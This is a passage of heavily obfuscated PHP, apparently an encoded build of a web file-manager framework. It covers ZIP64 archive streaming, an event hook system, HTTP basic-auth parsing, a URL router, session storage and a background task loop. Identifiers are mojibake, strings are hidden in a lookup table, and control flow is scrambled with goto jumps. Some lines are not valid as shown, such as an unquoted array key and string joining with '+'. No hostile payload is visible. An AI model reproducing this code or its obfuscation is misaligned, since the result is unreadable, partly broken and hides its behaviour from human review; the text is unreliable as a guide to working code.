$F’¨ÉÎÎ¹À = $this->packFields($EğÃ‰Ó•Û); $B£‘‰£ãœ = $A§…è½‚İ” . $b—ö§ğ‚Å½ . $CíºöãœÙ . $F’¨ÉÎÎ¹À; goto bÍ–¯æ“¾; d”®ˆàğÕÀ: $EÄ¶²“œ = $this->dosTime(time()); $e”†©¨Ìğ× = array(array($FŠ”²¹„¡[2002], static::CDR_FILE_SIGNATURE), array($FŠ”²¹„¡[2003], static::ZIP_VERSION_64), array($FŠ”²¹„¡[2003], static::ZIP_VERSION_64), array($FŠ”²¹„¡[2003], 8), array($FŠ”²¹„¡[2003], $d—ğšÓ±¢“), array($FŠ”²¹„¡[2002], $EÄ¶²“œ), array($FŠ”²¹„¡[2002], $b­“ã½À…Ÿ), array($FŠ”²¹„¡[2002], 4294967295), array($FŠ”²¹„¡[2002], 4294967295), array($FŠ”²¹„¡[2003], strlen($b—ö§ğ‚Å½)), array($FŠ”²¹„¡[2003], 32), array($FŠ”²¹„¡[2003], strlen($CíºöãœÙ)), array($FŠ”²¹„¡[2003], 0), array($FŠ”²¹„¡[2003], 0), array($FŠ”²¹„¡[2002], 32), array($FŠ”²¹„¡[2002], 4294967295)); $EğÃ‰Ó•Û = array(array($FŠ”²¹„¡[2003], 1), array($FŠ”²¹„¡[2003], 28), array($FŠ”²¹„¡[2004], $B•ŠÔŠ÷À), array($FŠ”²¹„¡[2004], $c„œíá§êë), array($FŠ”²¹„¡[2004], $d¾ÈÌ‘›˜©), array($FŠ”²¹„¡[2002], 0)); goto fë÷ÑÜßæÑ; cø°¬®·íñ: $FŠ”²¹„¡ =& $_SERVER[¨¤¼…´]; list($b—ö§ğ‚Å½, $d—ğšÓ±¢“, $b­“ã½À…Ÿ, $c„œíá§êë, $B•ŠÔŠ÷À, $d¾ÈÌ‘›˜©) = $CÈÌØ÷À¶„; $CíºöãœÙ = $FŠ”²¹„¡[43]; goto d”®ˆàğÕÀ; cëğ‘£”ˆ: } protected function addCdr64Eof() { goto F¥àÆ¨Æ‘ø; A„”¶‹À‡È: $this->send($E›ÇŸ­ìÖ); goto B¹ßÕñâàù; AËÄß»÷ìÜ: $f‡êÕÈÖ‹š = $this->ofs; $Dé®³™Û¦ = array(array($F¦ï‹‡Œ[2002], static::ZIP64_CDR_EOF_SIGNATURE), array($F¦ï‹‡Œ[2004], 44), array($F¦ï‹‡Œ[2003], static::ZIP_VERSION_64), array($F¦ï‹‡Œ[2003], static::ZIP_VERSION_64), array($F¦ï‹‡Œ[2002], 0), array($F¦ï‹‡Œ[2002], 0), array($F¦ï‹‡Œ[2004], $E³¬µ ¬ˆ“), array($F¦ï‹‡Œ[2004], $E³¬µ ¬ˆ“), array($F¦ï‹‡Œ[2004], $b…ä–Éß¢‰), array($F¦ï‹‡Œ[2004], $f‡êÕÈÖ‹š)); $E›ÇŸ­ìÖ = $this->packFields($Dé®³™Û¦); goto A„”¶‹À‡È; F¥àÆ¨Æ‘ø: $F¦ï‹‡Œ =& $_SERVER[¨¤¼…´]; $E³¬µ ¬ˆ“ = count($this->files); $b…ä–Éß¢‰ = $this->cdr_ofs; goto AËÄß»÷ìÜ; B¹ßÕñâàù: } protected function addCdr64Locator() { goto dàˆÅ‚ø¥‘; dàˆÅ‚ø¥‘: $cà¥×‘ÂÆ =& $_SERVER[¨¤¼…´]; $B’ÅØšãšÀ = count($this->files); $B”ÍÃ‚†²¨ = $this->cdr_ofs; goto D«®¾õŒ”; D«®¾õŒ”: $E¶ÃÆºß¹Ò = $this->ofs; $e¢†Á¥Ş‰‹ = array(array($cà¥×‘ÂÆ[2002], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($cà¥×‘ÂÆ[2002], 0), array($cà¥×‘ÂÆ[2004], $E¶ÃÆºß¹Ò + $B”ÍÃ‚†²¨), array($cà¥×‘ÂÆ[2002], 1)); $b¯‹Íè³À = $this->packFields($e¢†Á¥Ş‰‹); goto Eœ§äè»ë; Eœ§äè»ë: $this->send($b¯‹Íè³À); goto eˆ’Ú˜ƒŠ¨; eˆ’Ú˜ƒŠ¨: } protected function addCdrEof() { goto dƒî˜ÑùÄ; dƒî˜ÑùÄ: $eÍ´ä÷ÌÑ =& $_SERVER[¨¤¼…´]; $aò·‡¥ÖÇ¥ = count($this->files); $F˜ÍªÈ¹­Û = $this->cdr_ofs; goto cÛ½¥Ş´À¡; cÛ½¥Ş´À¡: $cİŸ»çŠ™Š = $this->ofs; $cºÑ‡Ü¼Ë = $eÍ´ä÷ÌÑ[43]; $F™¨Ç²£ö = array(array($eÍ´ä÷ÌÑ[2002], static::CDR_EOF_SIGNATURE), array($eÍ´ä÷ÌÑ[2003], 0), array($eÍ´ä÷ÌÑ[2003], 0), array($eÍ´ä÷ÌÑ[2003], $aò·‡¥ÖÇ¥), array($eÍ´ä÷ÌÑ[2003], $aò·‡¥ÖÇ¥), array($eÍ´ä÷ÌÑ[2002], 4294967295), array($eÍ´ä÷ÌÑ[2002], 4294967295), array($eÍ´ä÷ÌÑ[2003], strlen($cºÑ‡Ü¼Ë))); goto cóçõŞåÉí; cóçõŞåÉí: $C…¥á³Ò‚ù = $this->packFields($F™¨Ç²£ö) . $cºÑ‡Ü¼Ë; $this->send($C…¥á³Ò‚ù); goto AÎ°ù´‘Ì; AÎ°ù´‘Ì: } protected function addCdr() { foreach ($this->files as $D‹óŸø–ªª) { $this->addCdrFile($D‹óŸø–ªª); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $A…íßó„’Ø =& $_SERVER[¨¤¼…´]; $bÑ»ÏöÄ„ = $A…íßó„’Ø[216]; if ($this->outputName) { $e‡ç¨ãÅ¨‰ = trim(str_replace(array($A…íßó„’Ø[123], $A…íßó„’Ø[65], $A…íßó„’Ø[103], $A…íßó„’Ø[77], $A…íßó„’Ø[14], $A…íßó„’Ø[979]), $A…íßó„’Ø[43], $this->outputName)); $a¤Å¸İ™ßß = rawurlencode($e‡ç¨ãÅ¨‰); $bÑ»ÏöÄ„ .= "\73\40\146\x69\154\145\156\x61\155\145\52\75\x75\x74\146\x2d\x38\47\x27{$a¤Å¸İ™ßß}"; } $f³ï¢ÍÙ¬ = array($A…íßó„’Ø[213] => $A…íßó„’Ø[2005], $A…íßó„’Ø[2006] => $bÑ»ÏöÄ„, $A…íßó„’Ø[2007] => $A…íßó„’Ø[2008], $A…íßó„’Ø[2009] => $A…íßó„’Ø[2010], $A…íßó„’Ø[2011] => $A…íßó„’Ø[2012]); foreach ($f³ï¢ÍÙ¬ as $dŠ©¬¡ì’¦ => $cÙ…éâİ·) { header($dŠ©¬¡ì’¦ . $A…íßó„’Ø[866] . $cÙ…éâİ·); } } protected function send($EŒÖ§öË¥’) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $EŒÖ§öË¥’); } protected final function dosTime($bî¶„­Â¤½) { $B± ÷Øï =& $_SERVER[¨¤¼…´]; $Bš’ßÍ‹áŞ = getdate($bî¶„­Â¤½); if ($Bš’ßÍ‹áŞ[$B± ÷Øï[1712]] < 1980) { $Bš’ßÍ‹áŞ = array($B± ÷Øï[1712] => 1980, $B± ÷Øï[2013] => 1, $B± ÷Øï[2014] => 1, $B± ÷Øï[2015] => 0, $B± ÷Øï[2016] => 0, $B± ÷Øï[2017] => 0); } $Bš’ßÍ‹áŞ[$B± ÷Øï[1712]] -= 1980; return $Bš’ßÍ‹áŞ[$B± ÷Øï[1712]] << 25 | $Bš’ßÍ‹áŞ[$B± ÷Øï[2013]] << 21 | $Bš’ßÍ‹áŞ[$B± ÷Øï[2014]] << 16 | $Bš’ßÍ‹áŞ[$B± ÷Øï[2015]] << 11 | $Bš’ßÍ‹áŞ[$B± ÷Øï[2016]] << 5 | $Bš’ßÍ‹áŞ[$B± ÷Øï[2017]] >> 1; } protected function packFields($eß«­ˆ¹Ş›) { $CÚÜÍ‚Ü… =& $_SERVER[¨¤¼…´]; $A¾›º†ŞÌ› = $CÚÜÍ‚Ü…[43]; $D¯¥¯¼ö­ = array(); foreach ($eß«­ˆ¹Ş› as $C†·İ‰Éëâ) { $A¾›º†ŞÌ› .= $C†·İ‰Éëâ[0]; $D¯¥¯¼ö­[] = $C†·İ‰Éëâ[1]; } array_unshift($D¯¥¯¼ö­, $A¾›º†ŞÌ›); return call_user_func_array($CÚÜÍ‚Ü…[2018], $D¯¥¯¼ö­); } protected function filterFilename($DŞÍ†½ï) { $f‰Ü×¡’†÷ =& $_SERVER[¨¤¼…´]; return str_replace(array($f‰Ü×¡’†÷[103], $f‰Ü×¡’†÷[4], $f‰Ü×¡’†÷[190], $f‰Ü×¡’†÷[79], $f‰Ü×¡’†÷[123], $f‰Ü×¡’†÷[911], $f‰Ü×¡’†÷[914], $f‰Ü×¡’†÷[284]), $f‰Ü×¡’†÷[80], $DŞÍ†½ï); } } goto a‘ˆ¨§Å£; AàÏ»‘äÍ: function getimagesize_io($c¹Í Œ ‡Â, &$Fîéİö¾¥ = false) { $dÙÕ¶˜³ ‹ = StreamWrapperIO::read($c¹Í Œ ‡Â, 0, 1024 * 64); $c¹Í Œ ‡Â = $_SERVER[¨¤¼…´][1737] . base64_encode($dÙÕ¶˜³ ‹); return getimagesize($c¹Í Œ ‡Â, $Fîéİö¾¥); } class Hook { private static $events = array(); public static function get($AÈ×ŞØ«ù… = false) { if (!$AÈ×ŞØ«ù…) { return self::$events; } else { return self::$events[$AÈ×ŞØ«ù…]; } } public static function apply($eÆ«”“ˆ†Œ, $aÔéœ°œ¡ = array()) { $CªéÀ¼ßáà = ActionApply($eÆ«”“ˆ†Œ, $aÔéœ°œ¡); if (is_string($eÆ«”“ˆ†Œ)) { Hook::trigger($eÆ«”“ˆ†Œ); } return $CªéÀ¼ßáà; } public static function bind($D„÷¢ÏÜ, $e•Œ‹ÆêãÜ, $Dë™‡¼ÜÕµ = false) { $DæÏ¼Ş  =& $_SERVER[¨¤¼…´]; if (!isset(self::$events[$D„÷¢ÏÜ])) { self::$events[$D„÷¢ÏÜ] = array(); } self::$events[$D„÷¢ÏÜ][] = array($DæÏ¼Ş [1738] => $e•Œ‹ÆêãÜ, $DæÏ¼Ş [1739] => $Dë™‡¼ÜÕµ, $DæÏ¼Ş [1740] => 0); } public static function once($A÷ĞŞ²ÒŠ, $AÕíèëğØì) { self::bind($A÷ĞŞ²ÒŠ, $AÕíèëğØì, !0); } public static function unbind($d¨†¦ˆˆ†×, $f³ÊÒêª«§ = false) { if (!$f³ÊÒêª«§) { self::$events[$d¨†¦ˆˆ†×] = array(); return; } $FòÒÈåÇ = self::$events[$d¨†¦ˆˆ†×]; self::$events[$d¨†¦ˆˆ†×] = array(); if (!is_array($FòÒÈåÇ)) { return; } for ($eÏÊĞÆí¹£ = 0; $eÏÊĞÆí¹£ < count($FòÒÈåÇ); $eÏÊĞÆí¹£++) { if ($FòÒÈåÇ[$eÏÊĞÆí¹£][$_SERVER[¨¤¼…´][1738]] == $f³ÊÒêª«§) { continue; } self::$events[$d¨†¦ˆˆ†×][] = $FòÒÈåÇ[$eÏÊĞÆí¹£]; } } public static function filter($dÏÖ‘Åïª±, $c¸·ÎË‚ŠŸ) { goto Cğ¦Ÿñé ™; fÔ´¬²Ó“Ö: $a¬¢¸ò‰éÎ = $BŠ„ÉŞÈğë[$dÏÖ‘Åïª±]; $e¨İëÚê§Ï = $c¸·ÎË‚ŠŸ; if (!is_array($a¬¢¸ò‰éÎ) || count($a¬¢¸ò‰éÎ) == 0) { return $e¨İëÚê§Ï; } goto Dô„š‹¾; Dô„š‹¾: for ($f§šµŒŒ¢ƒ = 0; $f§šµŒŒ¢ƒ < count($a¬¢¸ò‰éÎ); $f§šµŒŒ¢ƒ++) { $B‚Í½ˆóŸİ = $a¬¢¸ò‰éÎ[$f§šµŒŒ¢ƒ]; if ($B‚Í½ˆóŸİ[$eã†‰‹»‡[1739]] && $B‚Í½ˆóŸİ[$eã†‰‹»‡[1740]] > 1) { continue; } self::$events[$dÏÖ‘Åïª±][$f§šµŒŒ¢ƒ][$eã†‰‹»‡[1740]] = $B‚Í½ˆóŸİ[$eã†‰‹»‡[1740]] + 1; $a’²²•›© = self::apply($B‚Í½ˆóŸİ[$eã†‰‹»‡[1738]], array($e¨İëÚê§Ï)); if (gettype($a’²²•›©) == gettype($e¨İëÚê§Ï)) { $e¨İëÚê§Ï = $a’²²•›©; } } return $e¨İëÚê§Ï; goto B³‚ÚÖºÑË; Cğ¦Ÿñé ™: $eã†‰‹»‡ =& $_SERVER[¨¤¼…´]; $BŠ„ÉŞÈğë = self::$events; if (!isset($BŠ„ÉŞÈğë[$dÏÖ‘Åïª±])) { return $c¸·ÎË‚ŠŸ; } goto fÔ´¬²Ó“Ö; B³‚ÚÖºÑË: } public static function trigger($dèˆÏ“˜‰ó) { goto e‡í˜“ŸÖ; cì÷ê„Š¯: $cÇ½‡ØÔÀƒ = func_get_args(); array_shift($cÇ½‡ØÔÀƒ); for ($dôï¾æááò = 0; $dôï¾æááò < count($B¯ÇŠ­ÆÙ); $dôï¾æááò++) { $aƒíÔÓÛ¿ = $B¯ÇŠ­ÆÙ[$dôï¾æááò]; if ($aƒíÔÓÛ¿[$c¬Õ‚¼–Š„[1739]] && $aƒíÔÓÛ¿[$c¬Õ‚¼–Š„[1740]] > 1) { continue; } if (defined($c¬Õ‚¼–Š„[1741]) && GLOBAL_LOG_HOOK) { write_log($dèˆÏ“˜‰ó . $c¬Õ‚¼–Š„[1742] . $aƒíÔÓÛ¿[$c¬Õ‚¼–Š„[1738]], $c¬Õ‚¼–Š„[1743]); } self::$events[$dèˆÏ“˜‰ó][$dôï¾æááò][$c¬Õ‚¼–Š„[1740]] = $aƒíÔÓÛ¿[$c¬Õ‚¼–Š„[1740]] + 1; $CÕÌáÑ‘ = self::apply($aƒíÔÓÛ¿[$c¬Õ‚¼–Š„[1738]], $cÇ½‡ØÔÀƒ); if (defined($c¬Õ‚¼–Š„[1741]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $c¬Õ‚¼–Š„[1743]); if ($aƒíÔÓÛ¿[$c¬Õ‚¼–Š„[1740]] == 200) { $BÒßĞŸæÎª = is_array($aƒíÔÓÛ¿[$c¬Õ‚¼–Š„[1738]]) ? json_encode_force($aƒíÔÓÛ¿[$c¬Õ‚¼–Š„[1738]]) : $aƒíÔÓÛ¿[$c¬Õ‚¼–Š„[1738]]; write_log($c¬Õ‚¼–Š„[1744] . $dèˆÏ“˜‰ó . $c¬Õ‚¼–Š„[1745] . $BÒßĞŸæÎª, $c¬Õ‚¼–Š„[1746]); } } $Fè–¿îìê— = is_null($CÕÌáÑ‘) ? $Fè–¿îìê— : $CÕÌáÑ‘; } goto fï¥µ£•†; e‡í˜“ŸÖ: $c¬Õ‚¼–Š„ =& $_SERVER[¨¤¼…´]; $e‰¤ìº¸¥„ = self::$events; $Fè–¿îìê— = !1; goto böïÃŒàëª; böïÃŒàëª: if (!isset($e‰¤ìº¸¥„[$dèˆÏ“˜‰ó])) { return $Fè–¿îìê—; } $B¯ÇŠ­ÆÙ = $e‰¤ìº¸¥„[$dèˆÏ“˜‰ó]; if (!is_array($B¯ÇŠ­ÆÙ) || count($B¯ÇŠ­ÆÙ) == 0) { return $Fè–¿îìê—; } goto cì÷ê„Š¯; fï¥µ£•†: return $Fè–¿îìê—; goto aç Çšâ‡Ò; aç Çšâ‡Ò: } } class HttpAuth { public static function get() { $A†Ö‡Ğ«¢ =& $_SERVER[¨¤¼…´]; $dàîÊ‹®íÜ = $A†Ö‡Ğ«¢[43]; $a½´¡ó°Æ¹ = $A†Ö‡Ğ«¢[43]; if (isset($_SERVER[$A†Ö‡Ğ«¢[1747]])) { $dàîÊ‹®íÜ = $_SERVER[$A†Ö‡Ğ«¢[1747]]; $a½´¡ó°Æ¹ = $_SERVER[$A†Ö‡Ğ«¢[1748]]; } elseif (isset($_SERVER[$A†Ö‡Ğ«¢[1749]])) { $BèÙö…ñ£Ş = $_SERVER[$A†Ö‡Ğ«¢[1749]]; if (strpos(strtolower($BèÙö…ñ£Ş), $A†Ö‡Ğ«¢[1750]) === 0) { $d”Î„²‚¥‚ = explode($A†Ö‡Ğ«¢[4], base64_decode(substr($BèÙö…ñ£Ş, 6))); $dàîÊ‹®íÜ = isset($d”Î„²‚¥‚[0]) ? $d”Î„²‚¥‚[0] : $A†Ö‡Ğ«¢[43]; $a½´¡ó°Æ¹ = isset($d”Î„²‚¥‚[1]) ? $d”Î„²‚¥‚[1] : 0; } } return array($A†Ö‡Ğ«¢[547] => $dàîÊ‹®íÜ, $A†Ö‡Ğ«¢[883] => $a½´¡ó°Æ¹); } public static function error() { goto e“”¹ÛáÄ¿; D®ÔÏ÷µÉ: header($B‚öõâ¥ßÅ[1753]); header($B‚öõâ¥ßÅ[1754]); header($B‚öõâ¥ßÅ[1252]); goto cÎŞ¤»‰”÷; e“”¹ÛáÄ¿: $B‚öõâ¥ßÅ =& $_SERVER[¨¤¼…´]; header($B‚öõâ¥ßÅ[1751]); header($B‚öõâ¥ßÅ[1752]); goto D®ÔÏ÷µÉ; cÎŞ¤»‰”÷: die; goto e§„¬®š; e§„¬®š: } public static function make($Aá…¸°¤Î, $eë‰Ï’ÒÚó) { $cİÉ·ïÄ‘ =& $_SERVER[¨¤¼…´]; return $cİÉ·ïÄ‘[1755] + base64_encode($Aá…¸°¤Î . $cİÉ·ïÄ‘[4] . $eë‰Ï’ÒÚó); } } goto FŸô„Øí¡š; EÅîºâ­²£: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\x2f\135\53", "\x3a\156\165\155" => "\x5b\x30\55\71\x5d\x2b", "\72\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($f‡ÄŒ‚œŒë, $F“•çÍâÂº) { $AÓçÎ­Ø =& $_SERVER[¨¤¼…´]; if ($f‡ÄŒ‚œŒë == $AÓçÎ­Ø[1374]) { $Bî£ôÌ¶•² = array_map($AÓçÎ­Ø[1375], $F“•çÍâÂº[0]); $Bõ¹¸‘¤Š¥ = strpos($F“•çÍâÂº[1], $AÓçÎ­Ø[8]) === 0 ? $F“•çÍâÂº[1] : $AÓçÎ­Ø[8] . $F“•çÍâÂº[1]; $eØ¡¢ÓëóÆ = $F“•çÍâÂº[2]; } else { $Bî£ôÌ¶•² = null; $Bõ¹¸‘¤Š¥ = strpos($F“•çÍâÂº[0], $AÓçÎ­Ø[8]) === 0 ? $F“•çÍâÂº[0] : $AÓçÎ­Ø[8] . $F“•çÍâÂº[0]; $eØ¡¢ÓëóÆ = $F“•çÍâÂº[1]; } array_push(self::$maps, $Bî£ôÌ¶•²); array_push(self::$routes, $Bõ¹¸‘¤Š¥); array_push(self::$methods, strtoupper($f‡ÄŒ‚œŒë)); array_push(self::$callbacks, $eØ¡¢ÓëóÆ); } public static function error($bØˆš“î½·) { self::$errorCallback = $bØˆš“î½·; } public static function haltOnMatch($F×¨ËÈâŞĞ = true) { self::$halts = $F×¨ËÈâŞĞ; } public static function dispatch() { goto E¤ÖÛî´ŠÄ; E¤ÖÛî´ŠÄ: $fÒ‘¹° =& $_SERVER[¨¤¼…´]; $D¶…ÏÀ‡³ = parse_url($_SERVER[$fÒ‘¹°[1376]], PHP_URL_PATH); $cäáä®”¹Ù = $_SERVER[$fÒ‘¹°[164]]; goto E„‰¿æ ; bİŠ’ÂÉµ»: self::$routes = preg_replace($fÒ‘¹°[1063], $fÒ‘¹°[8], self::$routes); if (in_array($D¶…ÏÀ‡³, self::$routes)) { $F—Âó–’Óô = array_keys(self::$routes, $D¶…ÏÀ‡³); foreach ($F—Âó–’Óô as $e•«‘ä´) { if (self::$methods[$e•«‘ä´] == $cäáä®”¹Ù || self::$methods[$e•«‘ä´] == $fÒ‘¹°[1377] || in_array($cäáä®”¹Ù, self::$maps[$e•«‘ä´])) { $CÒÑØ÷İÚ = !0; if (!is_object(self::$callbacks[$e•«‘ä´])) { $A¸·öƒ°äÕ = explode($fÒ‘¹°[8], self::$callbacks[$e•«‘ä´]); $a¤Äİ¬‘Ä® = end($A¸·öƒ°äÕ); $e÷ˆÛ±¦è = explode($fÒ‘¹°[1378], $a¤Äİ¬‘Ä®); $E¸˜«ê” = new $e÷ˆÛ±¦è[0](); $E¸˜«ê”->{$e÷ˆÛ±¦è[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$e•«‘ä´]); if (self::$halts) { return; } } } } } else { $fº³êÕŒƒŒ = 0; foreach (self::$routes as $e•«‘ä´) { if (strpos($e•«‘ä´, $fÒ‘¹°[4]) !== !1) { $e•«‘ä´ = str_replace($cìÕğØ¤, $b´ƒ½‹õ‹, $e•«‘ä´); } if (preg_match($fÒ‘¹°[1379] . $e•«‘ä´ . $fÒ‘¹°[1380], $D¶…ÏÀ‡³, $bß½óÖ‰ŠÈ)) { if (self::$methods[$fº³êÕŒƒŒ] == $cäáä®”¹Ù || self::$methods[$fº³êÕŒƒŒ] == $fÒ‘¹°[1377] || !empty(self::$maps[$fº³êÕŒƒŒ]) && in_array($cäáä®”¹Ù, self::$maps[$fº³êÕŒƒŒ])) { $CÒÑØ÷İÚ = !0; array_shift($bß½óÖ‰ŠÈ); if (!is_object(self::$callbacks[$fº³êÕŒƒŒ])) { $A¸·öƒ°äÕ = explode($fÒ‘¹°[8], self::$callbacks[$fº³êÕŒƒŒ]); $a¤Äİ¬‘Ä® = end($A¸·öƒ°äÕ); $e÷ˆÛ±¦è = explode($fÒ‘¹°[1378], $a¤Äİ¬‘Ä®); $E¸˜«ê” = new $e÷ˆÛ±¦è[0](); if (!method_exists($E¸˜«ê”, $e÷ˆÛ±¦è[1])) { echo $fÒ‘¹°[1381]; } else { call_user_func_array(array($E¸˜«ê”, $e÷ˆÛ±¦è[1]), $bß½óÖ‰ŠÈ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$fº³êÕŒƒŒ], $bß½óÖ‰ŠÈ); if (self::$halts) { return; } } } } $fº³êÕŒƒŒ++; } } if ($CÒÑØ÷İÚ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $DåçÒ«æö¯ =& $_SERVER[¨¤¼…´]; header($_SERVER[$DåçÒ«æö¯[1382]] . $DåçÒ«æö¯[1383]); echo $DåçÒ«æö¯[1384]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$fÒ‘¹°[1376]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto cëòÒï¤»÷; E„‰¿æ : $cìÕğØ¤ = array_keys(static::$patterns); $b´ƒ½‹õ‹ = array_values(static::$patterns); $CÒÑØ÷İÚ = !1; goto bİŠ’ÂÉµ»; cëòÒï¤»÷: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto F˜¸ß¼ÉØõ; F‘Î›ï¡˜Ÿ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $FÅ¸Æ«ª¼à = new self(); return $FÅ¸Æ«ª¼à; goto Bİ‘ˆ‚ô·Â; FÛ²İÀ¡: $C£¤¾‹øÀ = $FÌÂ­’ÊÚ[$BÃë‚ƒ¢Ò]; $B×ãŸ¯…›Ï = $FÌÂ­’ÊÚ[$C¢¦ô‘óğ[745]]; switch ($BÃë‚ƒ¢Ò) { case $C¢¦ô‘óğ[27]: self::$handle = Model($C¢¦ô‘óğ[746]); break; case $C¢¦ô‘óğ[747]: self::$handle = new CacheRedis($C£¤¾‹øÀ, $B×ãŸ¯…›Ï); break; case $C¢¦ô‘óğ[748]: self::$handle = new CacheMemcached($C£¤¾‹øÀ, $B×ãŸ¯…›Ï); break; case $C¢¦ô‘óğ[181]: $C£¤¾‹øÀ[$C¢¦ô‘óğ[85]] = $C£¤¾‹øÀ[$C¢¦ô‘óğ[85]] . $C¢¦ô‘óğ[1388]; self::$handle = new CacheFile($C£¤¾‹øÀ, $B×ãŸ¯…›Ï); default: break; } goto F‘Î›ï¡˜Ÿ; F˜¸ß¼ÉØõ: $C¢¦ô‘óğ =& $_SERVER[¨¤¼…´]; static $FÅ¸Æ«ª¼à = false; if ($FÅ¸Æ«ª¼à) { return $FÅ¸Æ«ª¼à; } goto f¼ÖíÂÚ‡‰; f¼ÖíÂÚ‡‰: $FÌÂ­’ÊÚ = $GLOBALS[$C¢¦ô‘óğ[6]][$C¢¦ô‘óğ[350]]; self::$sessionTime = $FÌÂ­’ÊÚ[$C¢¦ô‘óğ[1385]]; $F¢ì˜•½ÂŠ = isset($GLOBALS[$C¢¦ô‘óğ[1386]]) ? $GLOBALS[$C¢¦ô‘óğ[1386]] : SESSION_ID; goto FÁÓáÊ±¬„; FÁÓáÊ±¬„: if (self::$sessionSign) { } else { if (Cookie::get($F¢ì˜•½ÂŠ)) { self::$sessionSign = Cookie::get($F¢ì˜•½ÂŠ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($F¢ì˜•½ÂŠ, self::$sessionSign, self::$sessionTime); $BÃë‚ƒ¢Ò = $FÌÂ­’ÊÚ[$C¢¦ô‘óğ[1387]]; goto FÛ²İÀ¡; Bİ‘ˆ‚ô·Â: } public static function sign($B›‹Çö²Ìƒ = false) { $B›‹Çö²Ìƒ && (self::$sessionSign = $B›‹Çö²Ìƒ); self::init(); return self::$sessionSign; } public static function set($a‰°—¡©÷½, $D¥ó”•®¼ë = false) { self::init(); if (is_array($a‰°—¡©÷½)) { foreach ($a‰°—¡©÷½ as $cŸÆË¬Ì‘¬ => $cÇÉ¾Ø°) { array_set_value(self::$data, $cŸÆË¬Ì‘¬, $cÇÉ¾Ø°); } } else { array_set_value(self::$data, $a‰°—¡©÷½, $D¥ó”•®¼ë); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($bìƒñÅôù = false) { self::init(); if (!$bìƒñÅôù) { return self::$data; } return array_get_value(self::$data, $bìƒñÅôù); } public static function remove($A†Êù´öÒ¼) { self::init(); unset(self::$data[$A†Êù´öÒ¼]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¨¤¼…´][750])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto AŒÉàÑçÄâ; d•ÙÜ÷„Ç»: while (!0) { self::cacheClear(); if (self::valueGet($a»›¿¥«Àƒ[679]) != $a»›¿¥«Àƒ[93]) { self::valueSet($a»›¿¥«Àƒ[1389], $a»›¿¥«Àƒ[481]); self::log($a»›¿¥«Àƒ[1393]); die; } self::valueSet($a»›¿¥«Àƒ[1389], $a»›¿¥«Àƒ[93]); self::valueSet($a»›¿¥«Àƒ[1390], time()); self::taskRunAll(); sleep(self::valueGet($a»›¿¥«Àƒ[1394])); } goto fÔ˜ïÁŒÕœ; AŒÉàÑçÄâ: $a»›¿¥«Àƒ =& $_SERVER[¨¤¼…´]; if (self::valueGet($a»›¿¥«Àƒ[679]) != $a»›¿¥«Àƒ[93]) { return; } if (self::valueGet($a»›¿¥«Àƒ[1389]) == $a»›¿¥«Àƒ[93]) { $CÉ‹¯İõŠ = self::valueGet($a»›¿¥«Àƒ[1390]); if (time() - $CÉ‹¯İõŠ > 3600 * 2) { self::restart(); } return; } goto fíÑ¡Õß½Û; fíÑ¡Õß½Û: http_close(); self::valueSet($a»›¿¥«Àƒ[1389], $a»›¿¥«Àƒ[93]); Hook::bind($a»›¿¥«Àƒ[1391], $a»›¿¥«Àƒ[1392]); goto d•ÙÜ÷„Ç»; fÔ˜ïÁŒÕœ: } public static function restart() { $d–ôøÁôÔ =& $_SERVER[¨¤¼…´]; http_close(); self::valueSet($d–ôøÁôÔ[679], $d–ôøÁôÔ[481]); sleep(self::valueGet($d–ôøÁôÔ[1394]) + 5); self::valueSet($d–ôøÁôÔ[1389], $d–ôøÁôÔ[481]); self::valueSet($d–ôøÁôÔ[679], $d–ôøÁôÔ[93]); } public static function shutdownEvent() { $CÍêØÙ =& $_SERVER[¨¤¼…´]; self::valueSet($CÍêØÙ[1389], $CÍêØÙ[481]); self::log($CÍêØÙ[1395]); } public static function config($a«¾·íáè, $CµÅ„âÂ´‰) { $Bµàğäï‰¡ =& $_SERVER[¨¤¼…´]; $FãÀ‰âñÀ° = 20; $CµÅ„âÂ´‰ = intval($CµÅ„âÂ´‰) <= $FãÀ‰âñÀ° ? $FãÀ‰âñÀ° : intval($CµÅ„âÂ´‰); self::valueSet($Bµàğäï‰¡[679], $a«¾·íáè); self::valueSet($Bµàğäï‰¡[1394], $CµÅ„âÂ´‰); } private static function taskRunAll() { $C†˜»…½…÷ =& $_SERVER[¨¤¼…´]; $B†¥ëà’÷ä = Model($C†˜»…½…÷[1396])->listData(); $DöºÒ³É¡Ù = count($B†¥ëà’÷ä); for ($D¾Ê¸á°²¤ = 0; $D¾Ê¸á°²¤ < $DöºÒ³É¡Ù; $D¾Ê¸á°²¤++) { $d³…“æ‹Ö = $B†¥ëà’÷ä[$D¾Ê¸á°²¤]; if ($d³…“æ‹Ö[$C†˜»…½…÷[1397]] != $C†˜»…½…÷[93]) { continue; } if (!self::taskTimeCheck($d³…“æ‹Ö)) { continue; } self::taskRun($d³…“æ‹Ö); } Hook::trigger($C†˜»…½…÷[1398]); 